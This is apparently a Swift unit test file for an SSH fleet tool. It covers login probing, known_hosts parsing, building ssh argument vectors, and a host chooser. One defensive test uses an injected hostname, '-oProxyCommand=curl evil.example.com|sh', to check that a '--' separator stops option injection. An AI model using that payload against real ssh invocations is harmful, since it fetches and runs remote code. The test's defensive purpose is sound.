import XCTest
@testable import HangarCore

final class SSHLoginTests: XCTestCase {

    // MARK: - The free hint

    func testPlatformSuggestsTheConventionalLogin() {
        XCTAssertEqual(SSHLogin.expected(forPlatform: "Ubuntu Pro"), "ubuntu")
        XCTAssertEqual(SSHLogin.expected(forPlatform: "Red Hat Enterprise Linux"), "ec2-user")
        XCTAssertEqual(SSHLogin.expected(forPlatform: "SUSE Linux"), "ec2-user")
        XCTAssertEqual(SSHLogin.expected(forPlatform: "Debian GNU/Linux"), "admin")
    }

    /// platformDetails is a billing field. It lumps Amazon Linux and stock Ubuntu
    /// together under Linux/UNIX, so there is nothing to guess and it must say so
    /// rather than pick one.
    func testAnAmbiguousPlatformSuggestsNothing() {
        XCTAssertNil(SSHLogin.expected(forPlatform: "Linux/UNIX"))
        XCTAssertNil(SSHLogin.expected(forPlatform: nil))
        XCTAssertNil(SSHLogin.expected(forPlatform: ""))
    }

    func testWindowsSuggestsNothing() {
        XCTAssertNil(SSHLogin.expected(forPlatform: "Windows"))
    }

    // MARK: - The probe order

    func testThePlatformGuessIsTriedFirst() {
        let order = SSHLogin.probeOrder(platform: "Ubuntu Pro", effective: nil)
        XCTAssertEqual(order.first, "ubuntu",
                       "the free hint is what turns six attempts into one")
    }

    /// Twelve failed authentications against one host is what trips fail2ban.
    func testTheProbeIsCapped() {
        let order = SSHLogin.probeOrder(platform: nil, effective: nil)
        XCTAssertLessThanOrEqual(order.count, SSHLogin.probeLimit)
        XCTAssertEqual(SSHLogin.probeLimit, 6)
    }

    func testNoLoginIsTriedTwice() {
        let order = SSHLogin.probeOrder(platform: "Ubuntu Pro", effective: "ubuntu")
        XCTAssertEqual(Set(order).count, order.count)
    }

    // MARK: - Which host gets asked

    private func host(state: String, platform: String?, source: HostSource = .ec2) -> Instance {
        Instance(id: "i-\(UUID().uuidString.prefix(8))", state: state, type: "t3.small",
                 privateIP: "10.0.0.1", publicIP: nil, availabilityZone: "us-west-2a",
                 launchTime: "", tags: ["hostname": "h.example.com"],
                 platform: platform, source: source)
    }

    func testOnlyARunningHostIsAsked() {
        let picked = SSHLogin.probeCandidates(from: [
            host(state: "stopped", platform: "Linux/UNIX"),
            host(state: "running", platform: "Linux/UNIX"),
        ])
        XCTAssertEqual(picked.map(\.state), ["running"], "a stopped host cannot answer")
    }

    func testWindowsHostsAreNotAsked() {
        XCTAssertTrue(SSHLogin.probeCandidates(from: [
            host(state: "running", platform: "Windows"),
        ]).isEmpty, "there is no ssh login to learn")
    }

    /// An imported host is launched from the user's own config, which already
    /// carries its login. Probing it would learn something Hangar will not write.
    func testImportedHostsAreNotAsked() {
        XCTAssertTrue(SSHLogin.probeCandidates(from: [
            host(state: "running", platform: "Linux/UNIX", source: .sshConfig),
        ]).isEmpty)
    }

    func testAnEmptyFleetIsNotAsked() {
        XCTAssertTrue(SSHLogin.probeCandidates(from: []).isEmpty)
    }

    /// On a fleet behind a VPN most hosts are unreachable right now, so merely
    /// running is not evidence of anything. Having connected before is.
    func testAHostAlreadyInKnownHostsIsAskedFirst() {
        var a = host(state: "running", platform: "Linux/UNIX")
        a.tags["hostname"] = "unseen.example.com"
        var b = host(state: "running", platform: "Linux/UNIX")
        b.tags["hostname"] = "seen.example.com"
        let picked = SSHLogin.probeCandidates(from: [a, b],
                                              preferring: ["seen.example.com"])
        XCTAssertEqual(picked.first?.host, "seen.example.com")
        XCTAssertEqual(picked.count, 2, "the rest are still fallbacks")
    }

    func testMoreThanOneHostIsAskedButNotMany() {
        let fleet = (0..<20).map { _ in host(state: "running", platform: "Linux/UNIX") }
        XCTAssertEqual(SSHLogin.probeCandidates(from: fleet).count,
                       SSHLogin.probeHostLimit)
        XCTAssertEqual(SSHLogin.probeHostLimit, 3)
    }

    // MARK: - known_hosts

    func testReadsPlainKnownHostsEntries() throws {
        let path = NSTemporaryDirectory() + "kh-\(UUID().uuidString)"
        try """
        web1.example.com,10.0.0.1 ssh-ed25519 AAAAC3Nz
        [bastion.example.com]:2222 ssh-rsa AAAAB3Nz
        # a comment
        |1|hashedsalt=|hashedhost= ssh-ed25519 AAAAC3Nz
        """.write(toFile: path, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(atPath: path) }

        let names = SSHLogin.knownHostnames(paths: [path])
        XCTAssertTrue(names.contains("web1.example.com"))
        XCTAssertTrue(names.contains("10.0.0.1"), "a comma list names several hosts")
        XCTAssertTrue(names.contains("bastion.example.com"), "the port is not part of the name")
        XCTAssertEqual(names.count, 3, "a hashed entry cannot be matched and is skipped")
    }

    func testAMissingKnownHostsFileIsNotAnError() {
        XCTAssertTrue(SSHLogin.knownHostnames(paths: ["/nonexistent/known_hosts"]).isEmpty)
    }

    // MARK: - Did the host answer

    /// The distinction the retry depends on: "permission denied" is an answer,
    /// a refused connection is not.
    func testPermissionDeniedCountsAsAnAnswer() {
        XCTAssertFalse(SSHLogin.isUnreachable("Permission denied (publickey)."))
        XCTAssertFalse(SSHLogin.isUnreachable("ubuntu@host: Permission denied (publickey,password)."))
    }

    func testConnectionFailuresAreNotAnswers() {
        for detail in ["ssh: connect to host h port 22: Connection refused",
                       "ssh: connect to host h port 22: Operation timed out",
                       "ssh: Could not resolve hostname h: nodename nor servname provided",
                       "ssh: connect to host h port 22: No route to host",
                       "ssh: connect to host h port 22: Network is unreachable"] {
            XCTAssertTrue(SSHLogin.isUnreachable(detail), "should be unreachable: \(detail)")
        }
    }

    // MARK: - Probe state

    func testAProbeThatNeverReachedAnythingRunsAgain() {
        var state = LoginProbeState()
        XCTAssertTrue(state.shouldRun)
        state.attempts += 1
        XCTAssertTrue(state.shouldRun, "an unreachable fleet gets another go")
    }

    func testAProbeStopsOnceAHostAnswered() {
        var state = LoginProbeState(attempts: 1, settled: false)
        state.settled = true
        XCTAssertFalse(state.shouldRun)
    }

    func testAProbeGivesUpEventually() {
        XCTAssertFalse(LoginProbeState(attempts: LoginProbeState.maxAttempts,
                                       settled: false).shouldRun)
    }

    /// 0.2.0 wrote an empty file to mean "done". Reading it as a fresh state
    /// would probe someone who had already settled.
    func testAnEmptyMarkerFromAnEarlierVersionMeansDone() throws {
        let path = NSTemporaryDirectory() + "marker-\(UUID().uuidString)"
        FileManager.default.createFile(atPath: path, contents: Data())
        defer { try? FileManager.default.removeItem(atPath: path) }
        XCTAssertFalse(LoginProbeState.load(from: path).shouldRun)
    }

    func testStateRoundTrips() throws {
        let path = NSTemporaryDirectory() + "marker-\(UUID().uuidString)"
        defer { try? FileManager.default.removeItem(atPath: path) }
        LoginProbeState(attempts: 2, settled: false).save(to: path)
        XCTAssertEqual(LoginProbeState.load(from: path),
                       LoginProbeState(attempts: 2, settled: false))
    }

    // MARK: - The marker

    /// An unprompted outbound authentication attempt must not repeat on a timer.
    func testTheProbeMarkerLivesUnderHangarHomeAndIsCleared() {
        XCTAssertTrue(HangarConfig.loginProbedMarkerPath.hasPrefix(HangarConfig.home))
        XCTAssertTrue(HangarReset.paths(for: .everything)
            .contains(HangarConfig.loginProbedMarkerPath),
            "starting over has to mean the probe can run again")
    }
}

/// The argument vector `ssh` actually receives, and what a typed answer to
/// "which of these?" means.
final class SSHVectorTests: XCTestCase {

    private func arguments(_ target: String, user: String? = nil,
                           key: String? = nil, managed: Bool = true) -> [String] {
        SSHCommand.arguments(target: target, user: user, identityFile: key,
                             managedByConfig: managed)
    }

    func testArgv0IsTheProgram() {
        XCTAssertEqual(arguments("web-1").first, "ssh")
    }

    func testAManagedHostGetsNoFlags() {
        XCTAssertEqual(arguments("web-1"), ["ssh", "--", "web-1"])
    }

    /// ssh_config already carries the user and the key for a host Hangar wrote,
    /// so spelling them out again would override the file.
    func testAManagedHostIgnoresUserAndKey() {
        XCTAssertEqual(arguments("web-1", user: "rocky", key: "~/k.pem"),
                       ["ssh", "--", "web-1"])
    }

    func testAnUnmanagedHostSpellsOutUserAndKey() {
        XCTAssertEqual(arguments("web.example.com", user: "rocky", key: "~/k.pem",
                                 managed: false),
                       ["ssh", "-i", "~/k.pem", "--", "rocky@web.example.com"])
    }

    func testAnUnmanagedHostWithoutALoginIsJustTheHost() {
        XCTAssertEqual(arguments("web.example.com", managed: false),
                       ["ssh", "--", "web.example.com"])
    }

    /// Mistake 9. A hostname tag beginning with a hyphen is read as an option
    /// wherever it reaches an argument vector, and ProxyCommand is code ssh runs.
    /// An argument vector does not prevent that. `--` does.
    func testTheTargetIsAlwaysBehindADoubleHyphen() {
        for managed in [true, false] {
            let vector = arguments("-oProxyCommand=curl evil.example.com|sh",
                                   managed: managed)
            let separator = try? XCTUnwrap(vector.firstIndex(of: "--"))
            let target = try? XCTUnwrap(
                vector.firstIndex(of: "-oProxyCommand=curl evil.example.com|sh"))
            XCTAssertNotNil(separator)
            XCTAssertNotNil(target)
            if let separator, let target { XCTAssertLessThan(separator, target) }
        }
    }

    /// The line and the vector are the same decision rendered twice, so a panel
    /// and a shell cannot disagree about which user or key a host gets.
    func testTheLineAndTheVectorAgree() {
        for managed in [true, false] {
            let vector = SSHCommand.arguments(target: "web.example.com", user: "rocky",
                                              identityFile: "~/k.pem",
                                              managedByConfig: managed)
            let line = SSHCommand.line(target: "web.example.com", user: "rocky",
                                       identityFile: "~/k.pem",
                                       managedByConfig: managed)
            // Every element appears in the line, in order, quoted or not.
            var remaining = Substring(line)
            for element in vector {
                guard let found = remaining.range(of: element) else {
                    return XCTFail("'\(element)' is not in '\(line)'")
                }
                remaining = remaining[found.upperBound...]
            }
        }
    }

    /// Only what came from outside is quoted, or the line is unreadable.
    func testTheLineQuotesValuesAndNotFlags() {
        XCTAssertEqual(SSHCommand.line(target: "web 1", user: nil, identityFile: "~/k.pem",
                                       managedByConfig: false),
                       "ssh -i '~/k.pem' -- 'web 1'")
    }

    // MARK: - Choosing

    func testANumberInRangeIsAnIndex() {
        XCTAssertEqual(Chooser.choice("1", count: 3), 0)
        XCTAssertEqual(Chooser.choice("3", count: 3), 2)
        XCTAssertEqual(Chooser.choice(" 2 ", count: 3), 1)
    }

    /// Cancelling is the easy answer, because this is about to open a session on
    /// somebody's production host.
    func testAnythingElseCancels() {
        XCTAssertNil(Chooser.choice("", count: 3))
        XCTAssertNil(Chooser.choice(nil, count: 3))          // EOF
        XCTAssertNil(Chooser.choice("0", count: 3))
        XCTAssertNil(Chooser.choice("4", count: 3))
        XCTAssertNil(Chooser.choice("-1", count: 3))
        XCTAssertNil(Chooser.choice("yes", count: 3))
        XCTAssertNil(Chooser.choice("1 2", count: 3))
    }

    func testNothingToChooseFromChoosesNothing() {
        XCTAssertNil(Chooser.choice("1", count: 0))
    }
}

/// The rule that decides whether a command opens a session on a host nobody
/// named, and the pairing between what the chooser prints and what it reads.
final class ConnectDecisionTests: XCTestCase {

    func testNothingMatchedConnectsToNothing() {
        XCTAssertEqual(ConnectDecision.decide(matches: 0, takeFirst: false, canAsk: true),
                       .none)
        XCTAssertEqual(ConnectDecision.decide(matches: 0, takeFirst: true, canAsk: false),
                       .none)
    }

    func testOneMatchConnectsWithoutAsking() {
        XCTAssertEqual(ConnectDecision.decide(matches: 1, takeFirst: false, canAsk: true),
                       .connect(index: 0))
        XCTAssertEqual(ConnectDecision.decide(matches: 1, takeFirst: false, canAsk: false),
                       .connect(index: 0))
    }

    func testSeveralAskWhenThereIsSomebodyToAsk() {
        XCTAssertEqual(ConnectDecision.decide(matches: 4, takeFirst: false, canAsk: true),
                       .ask)
    }

    /// The case a script or an agent hits. Having a host picked for it is what
    /// `| head -1` was doing quietly.
    func testSeveralWithNobodyToAskRefuses() {
        XCTAssertEqual(ConnectDecision.decide(matches: 4, takeFirst: false, canAsk: false),
                       .tooMany(hosts: 4))
    }

    func testFirstSkipsTheQuestionEitherWay() {
        XCTAssertEqual(ConnectDecision.decide(matches: 9, takeFirst: true, canAsk: true),
                       .connect(index: 0))
        XCTAssertEqual(ConnectDecision.decide(matches: 9, takeFirst: true, canAsk: false),
                       .connect(index: 0))
    }

    // MARK: - What it prints and what it reads

    private func entries(_ count: Int) -> [SearchEntry] {
        (1...count).map {
            SearchEntry(instance: Fixture.instance(["product": "payments",
                                                    "env": "prod"],
                                                   id: "i-\($0)"),
                        alias: "web-\($0)")
        }
    }

    /// The one pairing where an off-by-one opens a session on the wrong host:
    /// every label the list prints must select the host printed beside it.
    func testEveryPrintedLabelSelectsTheHostBesideIt() {
        let hosts = entries(4)
        let lines = FleetOutput.numbered(hosts, terminal: .plain)
            .split(separator: "\n").map(String.init)
        XCTAssertEqual(lines.count, hosts.count)

        for (line, host) in zip(lines, hosts) {
            let label = line.trimmingCharacters(in: .whitespaces)
                .prefix { $0.isNumber }
            let index = Chooser.choice(String(label), count: hosts.count)
            XCTAssertEqual(index.map { hosts[$0].alias }, host.alias,
                           "label \(label) does not select \(host.alias)")
        }
    }

    func testTheListIsNumberedFromOne() {
        let text = FleetOutput.numbered(entries(3), terminal: .plain)
        XCTAssertTrue(text.hasPrefix("  1  "), text)
        XCTAssertFalse(text.contains("  0  "))
    }

    func testANonRunningHostSaysSoInTheChooser() {
        var stopped = Fixture.instance(["product": "payments"], state: "stopped")
        stopped.tags["hostname"] = "web.example.com"
        let text = FleetOutput.numbered([SearchEntry(instance: stopped, alias: "web-1")],
                                        terminal: .plain)
        XCTAssertTrue(text.contains("stopped"))
    }

    func testTheChooserPrintsNothingForNoHosts() {
        XCTAssertEqual(FleetOutput.numbered([], terminal: .plain), "")
    }
}
